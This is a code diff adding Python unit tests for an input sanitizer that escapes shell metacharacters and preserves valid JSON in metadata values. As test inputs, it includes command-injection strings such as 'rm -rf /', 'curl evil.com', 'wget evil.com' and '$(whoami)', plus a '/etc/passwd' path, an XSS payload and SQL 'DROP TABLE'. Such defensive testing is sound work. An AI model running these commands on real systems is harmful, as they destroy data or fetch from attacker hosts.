@@ -300,6 +300,101 @@ class TestInputSanitizer:
         sanitized = InputSanitizer.sanitize_metadata_value(long_value)
         assert len(sanitized) == 1000
 
+    def test_sanitize_metadata_value_json_preservation(self):
+        """Test that valid JSON is preserved while maintaining security."""
+        # Valid JSON should be preserved
+        json_cases = [
+            ('{"key": "value"}', '{"key": "value"}'),
+            ('["item1", "item2"]', '["item1", "item2"]'),
+            ('{"model": "PM10K", "specs": {"power": "10W"}}', '{"model": "PM10K", "specs": {"power": "10W"}}'),
+            ('{"empty": {}}', '{"empty": {}}'),
+            ('[]', '[]'),
+            ('{}', '{}'),
+        ]
+
+        for test_input, expected in json_cases:
+            result = InputSanitizer.sanitize_metadata_value(test_input)
+            assert result == expected, f"JSON should be preserved: {test_input}"
+            # Verify it's still valid JSON
+            import json
+            json.loads(result)  # Should not raise
+
+        # JSON with dangerous content should still be valid JSON but safe
+        dangerous_json_cases = [
+            ('{"cmd": "rm -rf /"}', '{"cmd": "rm -rf /"}'),  # Commands in JSON are data, not executed
+            ('{"pipe": "cat | grep"}', '{"pipe": "cat | grep"}'),  # Pipes in JSON are safe
+            ('{"path": "/etc/passwd"}', '{"path": "/etc/passwd"}'),  # Paths in JSON are safe
+            ('{"script": "<script>alert(1)</script>"}', '{"script": "<script>alert(1)</script>"}'),  # XSS in JSON is data
+        ]
+
+        for test_input, expected in dangerous_json_cases:
+            result = InputSanitizer.sanitize_metadata_value(test_input)
+            assert result == expected, f"JSON structure should be preserved: {test_input}"
+            json.loads(result)  # Should still be valid JSON
+
+        # Non-JSON with braces should be escaped
+        non_json_cases = [
+            ("{not json}", "\\{not json\\}"),
+            ("normal{value}here", "normal\\{value\\}here"),
+            ("{", "\\{"),
+            ("}", "\\}"),
+            ("}{", "\\}\\{"),
+            ('{"broken": json}', '\\{"broken": json\\}'),  # Invalid JSON gets escaped
+        ]
+
+        for test_input, expected in non_json_cases:
+            result = InputSanitizer.sanitize_metadata_value(test_input)
+            assert result == expected, f"Non-JSON braces should be escaped: {test_input}"
+
+    def test_sanitize_metadata_value_json_edge_cases(self):
+        """Test edge cases for JSON detection and sanitization."""
+        # Whitespace handling - JSON with spaces is preserved
+        assert InputSanitizer.sanitize_metadata_value('  {"key": "value"}  ') == '  {"key": "value"}  '
+
+        # JSON with newlines is also detected as JSON (since we strip() before checking)
+        assert InputSanitizer.sanitize_metadata_value('\n{"key": "value"}\n') == '\\n{"key": "value"}\\n'
+
+        # JSON with newlines inside (should be preserved as valid JSON)
+        json_with_newline = '{"key": "line1\\nline2"}'
+        result = InputSanitizer.sanitize_metadata_value(json_with_newline)
+        assert result == json_with_newline
+        json.loads(result)  # Should still be valid
+
+        # Almost JSON (missing quotes, etc)
+        almost_json_cases = [
+            ('{key: "value"}', '\\{key: "value"\\}'),  # Missing quotes on key
+            ("{'key': 'value'}", "\\{'key': 'value'\\}"),  # Single quotes (not valid JSON)
+            ('{"key": undefined}', '\\{"key": undefined\\}'),  # JavaScript, not JSON
+            ('{"key": "value",}', '\\{"key": "value",\\}'),  # Trailing comma
+        ]
+
+        for test_input, expected in almost_json_cases:
+            result = InputSanitizer.sanitize_metadata_value(test_input)
+            assert result == expected, f"Invalid JSON should be escaped: {test_input}"
+
+    def test_sanitize_metadata_value_injection_attempts(self):
+        """Test that injection attempts are properly handled based on context."""
+        # In regular values, these should be escaped
+        injection_attempts = [
+            ("value; system('rm -rf /')", "value\\; system\\('rm -rf /'\\)"),
+            ("value && curl evil.com", "value \\&\\& curl evil.com"),
+            ("value || wget evil.com", "value \\|\\| wget evil.com"),
+            ("$(whoami)", "\\\\$\\(whoami\\)"),
+            ("`id`", "\\\\`id\\\\`"),
+            ("${PATH}", "\\\\$\\{PATH\\}"),
+        ]
+
+        for test_input, expected in injection_attempts:
+            result = InputSanitizer.sanitize_metadata_value(test_input)
+            assert result == expected, f"Injection attempt should be escaped: {test_input}"
+
+        # In JSON values, the JSON structure provides safety
+        json_with_injection = '{"user_input": "rm -rf /; echo hacked"}'
+        result = InputSanitizer.sanitize_metadata_value(json_with_injection)
+        assert result == json_with_injection  # JSON preserved
+        parsed = json.loads(result)
+        assert parsed["user_input"] == "rm -rf /; echo hacked"  # Content is just data
+
     def test_sanitize_search_query_sql_injection(self):
         """Test that SQL injection attempts are sanitized."""
         queries = [
@@ -359,3 +454,86 @@ def test_convenience_functions(tmp_path):
     # Test sanitize_input
     assert sanitize_input("test$var", "metadata") == "test\\\\$var"
     assert sanitize_input("DROP TABLE users", "search") == "TABLE users"
+
+
+class TestIntegrationSecurity:
+    """Integration tests for security features across the pipeline."""
+
+    def test_metadata_json_flow_security(self):
+        """Test that JSON metadata flows safely through the pipeline."""
+        from utils.security import InputSanitizer
+
+        # Simulate metadata flow from CLI to storage
+        user_input = 'type=datasheet;specs={"power": "10W", "range": "100m"}'
+
+        # Parse metadata (simulating CLI parsing)
+        metadata = {}
+        for item in user_input.split(";"):
+            if "=" in item:
+                key, value = item.split("=", 1)
+                safe_key = InputSanitizer.sanitize_metadata_value(key.strip())
+                safe_value = InputSanitizer.sanitize_metadata_value(value.strip())
+                metadata[safe_key] = safe_value
+
+        # Verify JSON is preserved
+        assert metadata["type"] == "datasheet"
+        assert metadata["specs"] == '{"power": "10W", "range": "100m"}'
+
+        # Verify JSON can be parsed later
+        import json
+        specs = json.loads(metadata["specs"])
+        assert specs["power"] == "10W"
+        assert specs["range"] == "100m"
+
+    def test_filter_json_sanitization(self):
+        """Test that filter JSON is properly sanitized."""
+        from utils.security import InputSanitizer
+
+        # Test filter with potential injection
+        filter_json = '{"type": "sensor", "model": "PM10K; DROP TABLE"}'
+
+        # The filter JSON itself should be preserved
+        sanitized = InputSanitizer.sanitize_metadata_value(filter_json)
+        assert sanitized == filter_json  # JSON structure preserved
+
+        # Parse and verify
+        import json
+        parsed = json.loads(sanitized)
+        assert parsed["model"] == "PM10K; DROP TABLE"  # Content is just data, not executed
+
+    def test_nested_json_security(self):
+        """Test deeply nested JSON structures."""
+        from utils.security import InputSanitizer
+
+        nested_json = '''{"level1": {"level2": {"level3": {"cmd": "rm -rf /", "data": ["item1", "item2"]}}}}'''
+        result = InputSanitizer.sanitize_metadata_value(nested_json)
+
+        # Should be preserved
+        assert result == nested_json
+
+        # Should be parseable
+        import json
+        parsed = json.loads(result)
+        assert parsed["level1"]["level2"]["level3"]["cmd"] == "rm -rf /"
+        assert len(parsed["level1"]["level2"]["level3"]["data"]) == 2
+
+    def test_json_size_limits(self):
+        """Test that large JSON is handled properly."""
+        from utils.security import InputSanitizer
+
+        # Create a large but valid JSON
+        large_json = '{"data": "' + 'x' * 900 + '"}'
+        result = InputSanitizer.sanitize_metadata_value(large_json)
+
+        # Should be preserved if under limit
+        assert len(result) < 1000
+        import json
+        json.loads(result)  # Should still be valid
+
+        # Create JSON that exceeds limit
+        huge_json = '{"data": "' + 'x' * 1100 + '"}'
+        result = InputSanitizer.sanitize_metadata_value(huge_json)
+
+        # Should be truncated
+        assert len(result) == 1000
+        # Truncated JSON won't be valid anymore, but that's expected
